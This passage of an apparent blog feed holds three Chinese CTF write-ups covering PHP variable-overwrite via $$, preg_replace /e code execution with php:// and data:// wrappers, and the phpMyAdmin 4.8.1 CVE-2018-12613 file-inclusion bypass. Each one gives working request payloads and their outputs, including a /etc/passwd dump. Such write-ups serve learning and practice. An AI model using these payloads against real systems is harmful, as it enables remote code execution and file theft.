        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat-1题解"><a href="#BJDCTF2020-Mark-loves-cat-1题解" class="headerlink" title="BJDCTF2020 Mark loves cat 1题解"></a>BJDCTF2020 Mark loves cat 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>前一篇博文讲preg_replace /e模式的时候有一个坑涉及到了变量覆盖，当时没有展开讲，这里稍微提一嘴。<br><a href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span>$<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"c"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> $<span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span>输出为bc</code></pre><p>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'thinking'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span>  $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//这里进行了覆盖 $$key传入的值是name 传入进入成为$name 所以造成了name外部的变量被覆盖</span>  <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">var_dump</span><span class="token punctuation">(</span>$<span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//?name=test</span><span class="token comment" spellcheck="true">//output:string(4) “name”</span><span class="token comment" spellcheck="true">//string(4) “test”</span><span class="token comment" spellcheck="true">//string(4) “test”</span><span class="token comment" spellcheck="true">//test</span></code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>dirsearch扫描目录发现.git，githack下载源码，得到flag.php和index.php<br>flag.php：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>index.php：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></code></pre><p>首先分析第一个判断：get参数中的flag值绝对等于某个键名且键名中不能有flag。这个判断并不好绕进去。<br>分析第二个判断：get的flag和post的flag都为空，会返回$yds，根据变量覆盖漏洞，我们可以构造?yds=flag，这样$x=yds，$y=flag，$$x=$yds=$flag=$$y成功将flag的值赋到yds中输出，得到flag:flag{2cdc1281-db85-4d25-97fd-bf52b8217a02}<br>分析第三个判断：get型或者post型的flag必须有值且值为flag，且会返回is，那么可以构造?is=flag&amp;flag=flag，这样会进行赋值$is=$flag，$flag=$flag，成功输出flag，而如果flag是以post型flag的值会发生改变从而无法输出。<br>然后第二个判断和第三个判断互为补集，也就是说无法通过构造的方式达到最后一句，也就是只能利用中间的exit进行输出。</p><p>参考：<br><a href="https://www.cnblogs.com/gtx690/p/13289626.html">https://www.cnblogs.com/gtx690/p/13289626.html</a><br><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">https://blog.csdn.net/qq_43622442/article/details/105925473</a><br><a href="https://blog.csdn.net/qq_43801002/article/details/105991295">https://blog.csdn.net/qq_43801002/article/details/105991295</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php变量覆盖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 ZJCTF，不过如此 1题解</title>
      <link href="/2022/02/27/BJDCTF2020%20ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/27/BJDCTF2020%20ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此-1题解"><a href="#BJDCTF2020-ZJCTF，不过如此-1题解" class="headerlink" title="BJDCTF2020 ZJCTF，不过如此 1题解"></a>BJDCTF2020 ZJCTF，不过如此 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="preg-replace-e模式"><a href="#preg-replace-e模式" class="headerlink" title="preg_replace /e模式"></a>preg_replace /e模式</h3><p>参考<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a><br>对于</p><pre class=" language-php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text.plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complexStrtolower</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$regex</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span> <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$regex</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complexStrtolower</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>preg_replace 使用了***/e***模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 ‘strtolower(“\1”)’ 字符串，那这样要如何执行代码呢？<br>上面的命令执行，相当于 eval(‘strtolower(“\1”);’) 结果，当中的 \1 实际上就是 \1 ，而 \1 在正则表达式中有自己的含义。</p><h4 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h4><p>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>所以这里的 \1 实际上指定的是第一个子匹配项，拿一个payload分析***/?.*={${phpinfo()}}***</p><pre class=" language-1"><code class="language-1">原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});</code></pre><p>.* 是通过 GET 方式传入，你会发现无法执行 phpinfo 函数,会发现我们传上去的 .* 变成了 _* ，是因为在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，当非法字符为首字母时，只有点号会被替换成下划线<br>常用payload：\S*=${phpinfo()} </p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>见之前的博客</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，发现源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>利用data协议和php协议构造payload</p><pre class=" language-1"><code class="language-1">http://42ac15c1-17e9-4fe0-9c1a-fff5508c70a7.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php回显：PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</code></pre><p>base64解码后得到next.php源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们看到前面两个函数就是preg_replace的/e模式，可用漏洞。同时getFlag函数运行了cmd。于是可构造payload</p><pre class=" language-1"><code class="language-1">/next.php?\S*=${getFlag()}&cmd=system('cat /flag');回显:flag{30cd90b7-7b0b-4434-a831-83d5be39a04c} system('cat /flag'); </code></pre><p>得到flag:flag{30cd90b7-7b0b-4434-a831-83d5be39a04c}</p><p>参考：<br><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a><br><a href="https://blog.csdn.net/qq_48008847/article/details/118804275">https://blog.csdn.net/qq_48008847/article/details/118804275</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> preg_replace /e模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019 我有一个数据库 1题解</title>
      <link href="/2022/02/23/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/23/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="GWCTF-2019-我有一个数据库-1题解"><a href="#GWCTF-2019-我有一个数据库-1题解" class="headerlink" title="GWCTF 2019 我有一个数据库 1题解"></a>GWCTF 2019 我有一个数据库 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="phpmyadmin漏洞"><a href="#phpmyadmin漏洞" class="headerlink" title="phpmyadmin漏洞"></a>phpmyadmin漏洞</h3><h4 id="phpadmin"><a href="#phpadmin" class="headerlink" title="phpadmin"></a>phpadmin</h4><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。<br>攻击者必须经过身份验证，但在这些情况下除外：<br>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码；<br>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。<br>影响版本：phpMyAdmin 4.8.0和4.8.1</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>摘自：<a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">CVE-2018-12613复现</a><br>漏洞问题出在index.php的第55行开始位置：<br>1.target参数没有过滤,并且直接include，很显然是LFI的前奏<br>2.第57行限制 target 参数不能以index开头<br>3.第58行限制 target 参数不能出现在 $target_blacklist 内</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$target_blacklist 的定义：在 /index.php 的第50行，只要 target 参数不是import.php 或 export.php 就行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后一个限制方法，phpMyAdmin/libraries/classes/core.php，找到Core类的checkPageValidity方法</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$_page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>问题出现在第 465 行的urldecode() 我们可以利用这个函数绕过白名单检测，只要把 ? 两次url编码为 %253f 即可绕过验证。</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，发现一串看不懂的文字，扫描目录发现phpadmin，尝试访问，访问成功。发现phpmyadmin的版本是4.8.1。<br><img src="https://kingofkb.github.io/medias/images/20220209/1.png" alt="phpadmin"><br>百度发现该版本下的漏洞CVE-2018-12613。<br>构造：（../的数量是一个一个试的）</p><pre class=" language-1"><code class="language-1">http://35eb61ad-0999-4fc5-8077-aeeefcf7b5c9.node4.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f../../../../../../etc/passwd回显：root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin </code></pre><p>最后直接构造</p><pre class=" language-1"><code class="language-1">http://35eb61ad-0999-4fc5-8077-aeeefcf7b5c9.node4.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f../../../../../../flag回显:flag{4a5bc39b-5683-45b4-86d6-e43b58bfe1a2} </code></pre><p>得到flag:flag{4a5bc39b-5683-45b4-86d6-e43b58bfe1a2} </p><p>参考：<br><a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">https://blog.csdn.net/weixin_43872099/article/details/104128639</a><br><a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">https://blog.csdn.net/weixin_43872099/article/details/104128639</a><br><a href="http://sunu11.com/2018/07/25/22/">http://sunu11.com/2018/07/25/22/</a><br><a href="https://www.cnblogs.com/buchuo/p/12784408.html">https://www.cnblogs.com/buchuo/p/12784408.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpmyadmin漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
